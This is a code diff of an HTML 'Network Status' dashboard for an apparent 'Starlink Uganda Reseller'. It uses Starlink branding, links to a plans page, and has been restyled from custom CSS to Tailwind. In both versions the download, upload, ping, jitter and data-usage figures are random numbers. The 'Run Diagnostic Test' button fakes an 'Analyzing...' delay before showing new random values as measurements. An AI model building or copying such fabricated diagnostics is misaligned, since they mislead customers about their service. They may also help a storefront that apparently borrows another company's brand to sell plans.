@@ -5,767 +5,219 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Network Status - Starlink Uganda</title>
     <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* ============================================
-           RESET & BASE
-        ============================================ */
-        *, *::before, *::after {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         :root {
-            --black: #000000;
-            --white: #ffffff;
-            --gray-50: #f9fafb;
-            --gray-100: #f3f4f6;
-            --gray-200: #e5e7eb;
-            --gray-300: #d1d5db;
-            --gray-400: #9ca3af;
-            --gray-500: #6b7280;
-            --gray-600: #4b5563;
-            --gray-700: #374151;
-            --gray-800: #1f2937;
-            --gray-900: #111827;
-            --blue-400: #60a5fa;
-            --blue-500: #3b82f6;
-            --blue-600: #2563eb;
-            --blue-700: #1d4ed8;
-            --green-500: #22c55e;
-            --green-600: #16a34a;
-            --orange-500: #f97316;
-            --orange-600: #ea580c;
-            --purple-500: #a855f7;
-            --purple-600: #9333ea;
             --momo-yellow: #FFCC00;
-            --radius-sm: 10px;
-            --radius-md: 16px;
-            --radius-lg: 22px;
-            --radius-xl: 26px;
-            --shadow-sm: 0 1px 3px rgba(0,0,0,0.06), 0 1px 2px rgba(0,0,0,0.04);
-            --shadow-md: 0 4px 12px rgba(0,0,0,0.08);
-            --shadow-lg: 0 8px 20px rgba(0,0,0,0.12);
-            --shadow-xl: 0 12px 28px rgba(0,0,0,0.16);
-            --header-h: 74px;
-            --footer-h: 68px;
+            --momo-dark: #333333;
         }
-
-        html {
-            scroll-behavior: smooth;
+        .starlink-black {
+            background-color: #000000;
         }
-
+        .momo-yellow-bg {
+            background-color: var(--momo-yellow);
+        }
+        .momo-gradient {
+            background: linear-gradient(135deg, var(--momo-yellow) 0%, #FFD633 100%);
+        }
+        .card-shadow {
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .package-card {
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            cursor: pointer;
+        }
+        .package-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 8px 12px rgba(0, 0, 0, 0.15);
+        }
+        .package-card.selected {
+            border: 2px solid #000;
+            background-color: #f8fafc;
+        }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            background-color: var(--gray-50);
-            color: var(--gray-900);
-            line-height: 1.5;
-            padding-top: var(--header-h);
-            padding-bottom: var(--footer-h);
-            min-height: 100vh;
-            -webkit-font-smoothing: antialiased;
-        }
-
-        a { text-decoration: none; color: inherit; }
-        button { font-family: inherit; cursor: pointer; border: none; background: none; }
-
-        /* ============================================
-           HEADER
-        ============================================ */
-        .header {
-            position: fixed;
-            top: 0; left: 0; right: 0;
-            height: var(--header-h);
-            background-color: var(--black);
-            color: var(--white);
-            z-index: 100;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.4);
-        }
-
-        .header-inner {
-            max-width: 1200px;
-            margin: 0 auto;
-            height: 100%;
-            padding: 0 18px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .brand {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .brand-logo {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .brand-logo svg {
-            width: 34px;
-            height: 34px;
-        }
-
-        .brand-name {
-            font-size: 20px;
-            font-weight: 800;
-            letter-spacing: 4px;
-            color: var(--white);
-        }
-
-        .brand-divider {
-            width: 1px;
-            height: 26px;
-            background: rgba(255,255,255,0.2);
-            margin: 0 4px;
-        }
-
-        .brand-sub {
-            font-size: 12px;
-            color: var(--gray-400);
-            font-weight: 500;
-            letter-spacing: 0.5px;
-        }
-
-        .header-nav {
-            display: none;
-            gap: 26px;
-        }
-
-        .header-nav a {
-            color: var(--gray-300);
-            font-size: 14px;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 7px;
-            transition: color 0.2s;
-            position: relative;
-        }
-
-        .header-nav a:hover,
-        .header-nav a.active { color: var(--white); }
-
-        .header-nav a.active::after {
-            content: "";
-            position: absolute;
-            bottom: -8px;
-            left: 0; right: 0;
-            height: 2px;
-            background: var(--white);
-            border-radius: 2px;
-        }
-
-        .header-nav i { font-size: 18px; }
-
-        /* ============================================
-           MAIN LAYOUT
-        ============================================ */
-        .main {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 22px 16px 36px;
-        }
-
-        .stack {
-            display: flex;
-            flex-direction: column;
-            gap: 18px;
-        }
-
-        /* ============================================
-           CTA BANNER
-        ============================================ */
-        .cta-wrap {
-            background: var(--white);
-            border-radius: var(--radius-xl);
-            padding: 6px;
-            box-shadow: var(--shadow-md);
-        }
-
-        .cta-btn {
-            width: 100%;
-            background: linear-gradient(135deg, #2563eb 0%, #1e40af 50%, #1e3a8a 100%);
-            color: var(--white);
-            font-weight: 900;
-            font-size: 16px;
-            letter-spacing: 1.5px;
-            text-transform: uppercase;
-            padding: 20px 16px;
-            border-radius: var(--radius-lg);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            box-shadow: 0 8px 24px rgba(37,99,235,0.4);
-            transition: transform 0.15s, box-shadow 0.25s, filter 0.25s;
-            animation: ctaPulse 2.6s ease-in-out infinite;
-        }
-
-        .cta-btn:hover {
-            filter: brightness(1.08);
-            box-shadow: 0 10px 30px rgba(37,99,235,0.55);
-        }
-
-        .cta-btn:active { transform: scale(0.97); }
-
-        .cta-btn i { font-size: 24px; }
-
-        @keyframes ctaPulse {
-            0%, 100% { box-shadow: 0 8px 24px rgba(37,99,235,0.4); }
-            50%      { box-shadow: 0 8px 32px rgba(37,99,235,0.75); }
-        }
-
-        /* ============================================
-           SERVICE INFO CARD
-        ============================================ */
-        .info-card {
-            background: linear-gradient(135deg, #1f2937 0%, #000000 100%);
-            color: var(--white);
-            padding: 26px 22px;
-            border-radius: var(--radius-xl);
-            box-shadow: var(--shadow-lg);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .info-card::before {
-            content: "";
-            position: absolute;
-            top: -60px; right: -60px;
-            width: 180px; height: 180px;
-            background: radial-gradient(circle, rgba(59,130,246,0.35), transparent 70%);
-            border-radius: 50%;
-            pointer-events: none;
-        }
-
-        .info-label {
-            font-size: 11px;
-            font-weight: 700;
-            letter-spacing: 2.5px;
-            text-transform: uppercase;
-            color: var(--blue-400);
-        }
-
-        .info-title {
-            font-size: 26px;
-            font-weight: 900;
-            margin-top: 8px;
-            letter-spacing: -0.5px;
-        }
-
-        .info-desc {
-            color: var(--gray-400);
-            font-size: 14px;
-            margin-top: 12px;
-        }
-
-        .info-status {
-            display: inline-flex;
-            align-items: center;
-            gap: 7px;
-            margin-top: 16px;
-            font-size: 12px;
-            font-weight: 600;
-            background: rgba(34,197,94,0.12);
-            color: #4ade80;
-            padding: 6px 12px;
-            border-radius: 999px;
-            border: 1px solid rgba(34,197,94,0.3);
-        }
-
-        .info-status .dot {
-            width: 8px; height: 8px;
-            border-radius: 50%;
-            background: #4ade80;
-            box-shadow: 0 0 0 0 rgba(74,222,128,0.7);
-            animation: ping 1.8s infinite;
-        }
-
-        @keyframes ping {
-            0%   { box-shadow: 0 0 0 0 rgba(74,222,128,0.7); }
-            70%  { box-shadow: 0 0 0 8px rgba(74,222,128,0); }
-            100% { box-shadow: 0 0 0 0 rgba(74,222,128,0); }
-        }
-
-        /* ============================================
-           STATS GRID
-        ============================================ */
-        .stats-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-        }
-
-        .stat-card {
-            background: var(--white);
-            border-radius: var(--radius-md);
-            padding: 18px 16px;
-            box-shadow: var(--shadow-sm);
-            border: 1px solid var(--gray-100);
-            transition: transform 0.2s, box-shadow 0.2s;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .stat-card:hover {
-            transform: translateY(-3px);
-            box-shadow: var(--shadow-md);
-        }
-
-        .stat-card::after {
-            content: "";
-            position: absolute;
-            top: 0; left: 0;
-            width: 100%; height: 3px;
-            background: var(--accent, var(--blue-500));
-            opacity: 0.85;
-        }
-
-        .stat-head {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 10px;
-        }
-
-        .stat-label {
-            font-size: 11px;
-            font-weight: 800;
-            letter-spacing: 1.5px;
-            text-transform: uppercase;
-            color: var(--gray-600);
-        }
-
-        .stat-icon {
-            font-size: 20px;
-            color: var(--accent, var(--blue-600));
-        }
-
-        .stat-value {
-            font-size: 30px;
-            font-weight: 900;
-            color: var(--gray-900);
-            letter-spacing: -1px;
-            transition: opacity 0.3s;
-        }
-
-        .stat-unit {
-            font-size: 12px;
-            color: var(--gray-500);
-            margin-top: 3px;
-            font-weight: 500;
-        }
-
-        .stat-card.download { --accent: var(--blue-600); }
-        .stat-card.upload   { --accent: var(--green-600); }
-        .stat-card.ping     { --accent: var(--orange-600); }
-        .stat-card.jitter   { --accent: var(--purple-600); }
-
-        /* ============================================
-           DATA USAGE CARD
-        ============================================ */
-        .usage-card {
-            background: var(--white);
-            border-radius: var(--radius-md);
-            padding: 22px 20px;
-            box-shadow: var(--shadow-sm);
-            border: 1px solid var(--gray-100);
-        }
-
-        .usage-head {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 16px;
-        }
-
-        .usage-title {
-            display: flex;
-            align-items: center;
-            gap: 9px;
-            font-size: 16px;
-            font-weight: 800;
-            color: var(--gray-900);
-        }
-
-        .usage-title i {
-            font-size: 24px;
-            color: var(--blue-600);
-        }
-
-        .usage-badge {
-            font-size: 12px;
-            font-weight: 700;
-            color: var(--gray-700);
-            background: var(--gray-100);
-            padding: 5px 12px;
-            border-radius: 999px;
-        }
-
-        .progress-track {
-            width: 100%;
-            height: 12px;
-            background: var(--gray-200);
-            border-radius: 999px;
-            overflow: hidden;
-            margin-bottom: 10px;
-        }
-
-        .progress-bar {
-            height: 100%;
-            background: linear-gradient(90deg, var(--blue-500), var(--blue-700));
-            border-radius: 999px;
-            width: 0%;
-            transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1);
-            position: relative;
-        }
-
-        .progress-bar::after {
-            content: "";
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.35), transparent);
-            animation: shimmer 2.2s infinite;
-        }
-
-        @keyframes shimmer {
-            0%   { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-
-        .usage-footer {
-            display: flex;
-            justify-content: space-between;
-            font-size: 12px;
-            color: var(--gray-600);
-            font-weight: 600;
-        }
-
-        /* ============================================
-           ACTION BUTTONS
-        ============================================ */
-        .actions {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 12px;
-        }
-
-        .btn-outline {
-            width: 100%;
-            background: var(--white);
-            border: 1px solid var(--gray-200);
-            color: var(--gray-900);
-            font-weight: 700;
-            font-size: 15px;
-            padding: 15px;
-            border-radius: var(--radius-sm);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 9px;
-            box-shadow: var(--shadow-sm);
-            transition: transform 0.15s, background 0.2s, border-color 0.2s;
-        }
-
-        .btn-outline:hover {
-            background: var(--gray-50);
-            border-color: var(--gray-300);
-        }
-
-        .btn-outline:active { transform: scale(0.97); }
-        .btn-outline:disabled { opacity: 0.65; cursor: not-allowed; }
-        .btn-outline i { font-size: 20px; color: var(--blue-600); }
-
-        .spinner {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 2px solid var(--gray-300);
-            border-top-color: var(--blue-600);
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        /* ============================================
-           BOTTOM NAV
-        ============================================ */
-        .bottom-nav {
-            position: fixed;
-            bottom: 0; left: 0; right: 0;
-            height: var(--footer-h);
-            background: var(--white);
-            border-top: 1px solid var(--gray-200);
-            box-shadow: 0 -4px 20px rgba(0,0,0,0.08);
-            z-index: 100;
-        }
-
-        .bottom-nav-inner {
-            max-width: 1200px;
-            margin: 0 auto;
-            height: 100%;
-            padding: 0 12px;
-            display: flex;
-            justify-content: space-around;
-            align-items: center;
-        }
-
-        .nav-item {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 4px;
-            color: var(--gray-600);
-            font-size: 11px;
-            font-weight: 700;
-            transition: color 0.2s, transform 0.2s;
-            padding: 6px 14px;
-            border-radius: 12px;
-        }
-
-        .nav-item i { font-size: 24px; }
-        .nav-item:hover { transform: translateY(-2px); }
-        .nav-item.active { color: var(--blue-600); }
-
-        /* ============================================
-           RESPONSIVE
-        ============================================ */
-        @media (min-width: 640px) {
-            .main { padding: 28px 22px 44px; }
-            .stats-grid { gap: 16px; }
-            .stat-card { padding: 22px 20px; }
-            .stat-value { font-size: 34px; }
-            .info-card { padding: 32px 30px; }
-            .info-title { font-size: 32px; }
-            .cta-btn { font-size: 17px; padding: 22px; }
-        }
-
-        @media (min-width: 768px) {
-            .header-nav { display: flex; }
-        }
-
-        @media (min-width: 900px) {
-            .stats-grid { grid-template-columns: repeat(4, 1fr); }
+            padding-top: 72px; /* Height of fixed header */
+            padding-bottom: 72px; /* Height of fixed footer */
         }
     </style>
 </head>
-<body>
-
-    <!-- ============ HEADER ============ -->
-    <header class="header">
-        <div class="header-inner">
-            <a href="/" class="brand">
-                <div class="brand-logo">
-                    <!-- Starlink-style inline SVG logo -->
-                    <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Starlink">
-                        <circle cx="32" cy="32" r="30" stroke="#ffffff" stroke-width="3" fill="none"/>
-                        <path d="M8 32c0-4 3-7 7-7h34c4 0 7 3 7 7s-3 7-7 7H15c-4 0-7-3-7-7z" fill="#ffffff"/>
-                        <circle cx="32" cy="32" r="6" fill="#000000"/>
-                        <circle cx="32" cy="32" r="3" fill="#2563eb"/>
-                    </svg>
-                    <span class="brand-name">STARLINK</span>
-                </div>
-                <div class="brand-divider"></div>
-                <span class="brand-sub">Uganda Reseller</span>
+<body class="bg-gray-50">
+    <!-- Fixed Header -->
+    <header class="bg-black text-white shadow-sm fixed top-0 left-0 right-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
+            <a href="/" class="flex items-center gap-2">
+                <img src="https://ug-starlinknetwork.up.railway.app/static/images/starlink_logo_new.png" alt="STARLINK" class="h-14 sm:h-16">
+                <span class="text-sm border-l pl-2 ml-2 border-gray-600 hidden sm:inline">Uganda Reseller</span>
             </a>
-
-            <nav class="header-nav">
-                <a href="/dashboard/" class="active">
+            <nav class="hidden md:flex gap-6">
+                <a href="/dashboard/" class="text-gray-300 hover:text-white flex items-center gap-2">
                     <i class="uil uil-wifi"></i> <span>Status</span>
                 </a>
-                <a href="/plans/">
+                <a href="/plans/" class="text-gray-300 hover:text-white flex items-center gap-2">
                     <i class="uil uil-home"></i> <span>Plans</span>
                 </a>
             </nav>
         </div>
     </header>
 
-    <!-- ============ MAIN ============ -->
-    <main class="main">
-        <div class="stack">
+    <!-- Messages -->
+    
 
-            <!-- CTA -->
-            <div class="cta-wrap">
-                <button class="cta-btn" onclick="window.location.href='/plans/'">
-                    <i class="uil uil-shopping-bag"></i>
-                    <span>Choose Your Package</span>
-                </button>
-            </div>
+    <!-- Main Content -->
+    <main class="max-w-7xl mx-auto px-4 py-8">
+        
+<div class="space-y-6">
+    
+    <div class="relative overflow-hidden bg-white rounded-3xl p-1 card-shadow">
+        <button onclick="window.location.href='/plans/'" 
+                class="w-full bg-gradient-to-r from-blue-600 via-blue-700 to-blue-800 hover:from-blue-700 hover:to-blue-900 text-white font-black py-5 rounded-2xl transition-all transform active:scale-95 flex items-center justify-center gap-3 shadow-xl animate-pulse">
+            <i class="uil uil-shopping-bag text-2xl"></i>
+            <span class="text-lg uppercase tracking-wider">Choose Your Package</span>
+        </button>
+    </div>
 
-            <!-- Info Card -->
-            <div class="info-card">
-                <p class="info-label">Service Information</p>
-                <h1 class="info-title">Starlink Uganda</h1>
-                <p class="info-desc">Select a plan to activate high-speed satellite internet.</p>
-                <span class="info-status">
-                    <span class="dot"></span> System Online
-                </span>
-            </div>
-
-            <!-- Stats -->
-            <div class="stats-grid">
-                <div class="stat-card download">
-                    <div class="stat-head">
-                        <p class="stat-label">Download</p>
-                        <i class="uil uil-arrow-down stat-icon"></i>
-                    </div>
-                    <p class="stat-value" id="download-speed">--</p>
-                    <p class="stat-unit">Mbps</p>
-                </div>
-
-                <div class="stat-card upload">
-                    <div class="stat-head">
-                        <p class="stat-label">Upload</p>
-                        <i class="uil uil-arrow-up stat-icon"></i>
-                    </div>
-                    <p class="stat-value" id="upload-speed">--</p>
-                    <p class="stat-unit">Mbps</p>
-                </div>
-
-                <div class="stat-card ping">
-                    <div class="stat-head">
-                        <p class="stat-label">Ping</p>
-                        <i class="uil uil-pulse stat-icon"></i>
-                    </div>
-                    <p class="stat-value" id="ping">--</p>
-                    <p class="stat-unit">ms</p>
-                </div>
-
-                <div class="stat-card jitter">
-                    <div class="stat-head">
-                        <p class="stat-label">Jitter</p>
-                        <i class="uil uil-wave stat-icon"></i>
-                    </div>
-                    <p class="stat-value" id="jitter">--</p>
-                    <p class="stat-unit">ms</p>
-                </div>
-            </div>
-
-            <!-- Data Usage -->
-            <div class="usage-card">
-                <div class="usage-head">
-                    <div class="usage-title">
-                        <i class="uil uil-database"></i>
-                        <h3>Data Usage</h3>
-                    </div>
-                    <span class="usage-badge" id="data-percentage">0%</span>
-                </div>
-
-                <div class="progress-track">
-                    <div class="progress-bar" id="data-progress"></div>
-                </div>
-
-                <div class="usage-footer">
-                    <span id="data-used">0 GB</span>
-                    <span id="data-limit">100 GB</span>
-                </div>
-            </div>
-
-            <!-- Actions -->
-            <div class="actions">
-                <button class="btn-outline" id="diagnostic-btn" onclick="runSpeedTest()">
-                    <i class="uil uil-bolt"></i> Run Diagnostic Test
-                </button>
+    <div class="bg-gradient-to-br from-gray-800 to-black text-white p-6 sm:p-8 rounded-3xl card-shadow">
+        <div class="flex items-center justify-between mb-4">
+            <div>
+                <p class="text-blue-400 text-xs sm:text-sm font-semibold uppercase tracking-widest">Service Information</p>
+                <h1 class="text-2xl sm:text-3xl font-black mt-2">Starlink Uganda</h1>
             </div>
 
         </div>
+        <p class="text-gray-400 text-sm">Select a plan to activate high-speed satellite internet.</p>
+    </div>
+
+    <div class="grid grid-cols-2 gap-3 sm:gap-4">
+        <div class="bg-white rounded-2xl p-4 sm:p-6 card-shadow border border-gray-100">
+            <div class="flex items-center justify-between mb-3">
+                <p class="text-gray-600 text-xs font-bold uppercase tracking-widest">Download</p>
+                <i class="uil uil-arrow-down text-blue-600 text-lg sm:text-xl"></i>
+            </div>
+            <p class="text-2xl sm:text-3xl font-black text-gray-900" id="download-speed">--</p>
+            <p class="text-gray-500 text-xs mt-1">Mbps</p>
+        </div>
+
+        <div class="bg-white rounded-2xl p-4 sm:p-6 card-shadow border border-gray-100">
+            <div class="flex items-center justify-between mb-3">
+                <p class="text-gray-600 text-xs font-bold uppercase tracking-widest">Upload</p>
+                <i class="uil uil-arrow-up text-green-600 text-lg sm:text-xl"></i>
+            </div>
+            <p class="text-2xl sm:text-3xl font-black text-gray-900" id="upload-speed">--</p>
+            <p class="text-gray-500 text-xs mt-1">Mbps</p>
+        </div>
+
+        <div class="bg-white rounded-2xl p-4 sm:p-6 card-shadow border border-gray-100">
+            <div class="flex items-center justify-between mb-3">
+                <p class="text-gray-600 text-xs font-bold uppercase tracking-widest">Ping</p>
+                <i class="uil uil-pulse text-orange-600 text-lg sm:text-xl"></i>
+            </div>
+            <p class="text-2xl sm:text-3xl font-black text-gray-900" id="ping">--</p>
+            <p class="text-gray-500 text-xs mt-1">ms</p>
+        </div>
+
+        <div class="bg-white rounded-2xl p-4 sm:p-6 card-shadow border border-gray-100">
+            <div class="flex items-center justify-between mb-3">
+                <p class="text-gray-600 text-xs font-bold uppercase tracking-widest">Jitter</p>
+                <i class="uil uil-wave text-purple-600 text-lg sm:text-xl"></i>
+            </div>
+            <p class="text-2xl sm:text-3xl font-black text-gray-900" id="jitter">--</p>
+            <p class="text-gray-500 text-xs mt-1">ms</p>
+        </div>
+    </div>
+
+    <div class="bg-white rounded-2xl p-6 sm:p-8 card-shadow border border-gray-100">
+        <div class="flex items-center justify-between mb-4">
+            <div class="flex items-center gap-2">
+                <i class="uil uil-database text-blue-600 text-2xl"></i>
+                <h3 class="text-lg font-bold text-gray-900">Data Usage</h3>
+            </div>
+            <span class="text-xs font-semibold text-gray-600 bg-gray-100 px-3 py-1 rounded-full" id="data-percentage">0%</span>
+        </div>
+        
+        <div class="w-full bg-gray-200 rounded-full h-3 mb-3 overflow-hidden">
+            <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-full rounded-full transition-all duration-500" id="data-progress" style="width: 0%"></div>
+        </div>
+        
+        <div class="flex justify-between text-xs text-gray-600">
+            <span id="data-used">0 GB</span>
+            <span id="data-limit">100 GB</span>
+        </div>
+    </div>
+
+    <div class="grid grid-cols-1 gap-3">
+        <button onclick="runSpeedTest()" class="w-full bg-white border border-gray-200 text-gray-900 font-bold py-3 rounded-xl transition transform active:scale-95 flex items-center justify-center gap-2 card-shadow">
+            <i class="uil uil-bolt text-blue-600"></i> Run Diagnostic Test
+        </button>
+    </div>
+</div>
+
+
+
+<script>
+    // ... (Keep existing script logic for generating and updating stats)
+    function generateNetworkStats() {
+        return {
+            download: (Math.random() * 100 + 100).toFixed(2),
+            upload: (Math.random() * 20 + 20).toFixed(2),
+            ping: Math.floor(Math.random() * 40 + 20),
+            jitter: Math.floor(Math.random() * 8 + 2),
+            dataUsed: (Math.random() * 30 + 20).toFixed(1),
+            dataLimit: 100
+        };
+    }
+
+    function updateNetworkStats() {
+        const stats = generateNetworkStats();
+        document.getElementById('download-speed').textContent = stats.download;
+        document.getElementById('upload-speed').textContent = stats.upload;
+        document.getElementById('ping').textContent = stats.ping;
+        document.getElementById('jitter').textContent = stats.jitter;
+        document.getElementById('data-used').textContent = stats.dataUsed + ' GB';
+        document.getElementById('data-limit').textContent = stats.dataLimit + ' GB';
+        
+        const percentage = (stats.dataUsed / stats.dataLimit * 100).toFixed(0);
+        document.getElementById('data-percentage').textContent = percentage + '%';
+        document.getElementById('data-progress').style.width = percentage + '%';
+    }
+
+    function runSpeedTest() {
+        const button = event.target.closest('button');
+        const originalText = button.innerHTML;
+        button.innerHTML = '<i class="uil uil-spinner-alt animate-spin"></i> Analyzing...';
+        button.disabled = true;
+        
+        setTimeout(() => {
+            updateNetworkStats();
+            button.innerHTML = originalText;
+            button.disabled = false;
+        }, 2500);
+    }
+
+    document.addEventListener('DOMContentLoaded', updateNetworkStats);
+</script>
+
     </main>
 
-    <!-- ============ BOTTOM NAV ============ -->
-    <nav class="bottom-nav">
-        <div class="bottom-nav-inner">
-            <a href="/dashboard/" class="nav-item active">
-                <i class="uil uil-wifi"></i>
-                <span>Status</span>
+    <!-- Fixed Bottom Navigation -->
+    <nav class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 shadow-2xl z-50">
+        <div class="max-w-7xl mx-auto px-2 sm:px-4 py-2 sm:py-3 flex justify-around items-center">
+            <a href="/dashboard/" class="flex flex-col items-center gap-1 text-blue-600 transition-all">
+                <i class="uil uil-wifi text-2xl"></i>
+                <span class="text-xs font-semibold">Status</span>
             </a>
-            <a href="/plans/" class="nav-item">
-                <i class="uil uil-shopping-bag"></i>
-                <span>Plans</span>
+            
+            <a href="/plans/" class="flex flex-col items-center gap-1 text-gray-600 transition-all">
+                <i class="uil uil-shopping-bag text-2xl"></i>
+                <span class="text-xs font-semibold">Plans</span>
             </a>
-            <a href="/settings/" class="nav-item">
-                <i class="uil uil-setting"></i>
-                <span>Settings</span>
+            
+            <a href="#" class="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all">
+                <i class="uil uil-setting text-2xl"></i>
+                <span class="text-xs font-semibold">Settings</span>
             </a>
         </div>
     </nav>
-
-    <!-- ============ SCRIPT ============ -->
-    <script>
-        function generateNetworkStats() {
-            return {
-                download: (Math.random() * 100 + 100).toFixed(2),
-                upload: (Math.random() * 20 + 20).toFixed(2),
-                ping: Math.floor(Math.random() * 40 + 20),
-                jitter: Math.floor(Math.random() * 8 + 2),
-                dataUsed: (Math.random() * 30 + 20).toFixed(1),
-                dataLimit: 100
-            };
-        }
-
-        function animateValue(el, start, end, duration, decimals) {
-            const startTime = performance.now();
-            function frame(now) {
-                const progress = Math.min((now - startTime) / duration, 1);
-                const eased = 1 - Math.pow(1 - progress, 3);
-                const current = start + (end - start) * eased;
-                el.textContent = decimals ? current.toFixed(decimals) : Math.round(current);
-                if (progress < 1) requestAnimationFrame(frame);
-            }
-            requestAnimationFrame(frame);
-        }
-
-        function updateNetworkStats(animate) {
-            const stats = generateNetworkStats();
-            const dl = document.getElementById('download-speed');
-            const ul = document.getElementById('upload-speed');
-            const pg = document.getElementById('ping');
-            const jt = document.getElementById('jitter');
-            const used = document.getElementById('data-used');
-            const limit = document.getElementById('data-limit');
-            const pct = document.getElementById('data-percentage');
-            const bar = document.getElementById('data-progress');
-
-            if (animate) {
-                animateValue(dl, 0, parseFloat(stats.download), 900, 2);
-                animateValue(ul, 0, parseFloat(stats.upload), 900, 2);
-                animateValue(pg, 0, stats.ping, 700, 0);
-                animateValue(jt, 0, stats.jitter, 700, 0);
-                animateValue(used, 0, parseFloat(stats.dataUsed), 900, 1);
-            } else {
-                dl.textContent = stats.download;
-                ul.textContent = stats.upload;
-                pg.textContent = stats.ping;
-                jt.textContent = stats.jitter;
-                used.textContent = stats.dataUsed + ' GB';
-            }
-
-            limit.textContent = stats.dataLimit + ' GB';
-
-            const percentage = (stats.dataUsed / stats.dataLimit * 100).toFixed(0);
-            pct.textContent = percentage + '%';
-            bar.style.width = percentage + '%';
-        }
-
-        function runSpeedTest() {
-            const button = document.getElementById('diagnostic-btn');
-            const originalHTML = button.innerHTML;
-            button.innerHTML = '<span class="spinner"></span> Analyzing...';
-            button.disabled = true;
-
-            setTimeout(() => {
-                updateNetworkStats(true);
-                button.innerHTML = originalHTML;
-                button.disabled = false;
-            }, 2200);
-        }
-
-        document.addEventListener('DOMContentLoaded', () => updateNetworkStats(true));
-    </script>
 </body>
 </html>
